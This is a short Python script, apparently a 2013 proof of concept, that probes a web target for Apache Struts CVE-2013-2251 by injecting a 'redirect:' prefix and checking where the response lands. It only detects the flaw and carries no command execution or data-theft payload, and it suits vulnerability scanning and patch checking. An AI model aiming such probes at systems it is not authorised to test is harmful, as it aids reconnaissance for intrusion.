#!/usr/bin/python
#-*- coding:utf-8 -*-

'''
Created on 2013-8-22
struts CVE-2013-2251 detective
authon: ligolas
'''

import urllib2,argparse,re

def poc(targetUrl,baseUrl='http://www.baidu.com'):
    if not(re.match('(?:http|ftp|https)://', targetUrl)):
        targetUrl='http://'+targetUrl
    if not(re.match('(?:http|ftp|https)://', baseUrl)):
        baseUrl='http://'+baseUrl
    baseUrl+='/'
    testUrl=targetUrl+'?redirect:'+baseUrl
    redirectUrl=urllib2.urlopen(testUrl).geturl()
    if(redirectUrl==baseUrl):
        return True
    else:
        return False
    

if __name__ == '__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument("targetUrl",help="the url to be test")
    parser.add_argument("-b","--base",help="the url to be rediretced to")
    args=parser.parse_args()
    if args.base:
        if(poc(args.targetUrl,args.base)):
            print 'vulnerability exists'
        else:
            print 'vulnerability not exists'
    else:
        if(poc(args.targetUrl)):
            print 'vulnerability exists'
        else:
            print 'vulnerability not exists'


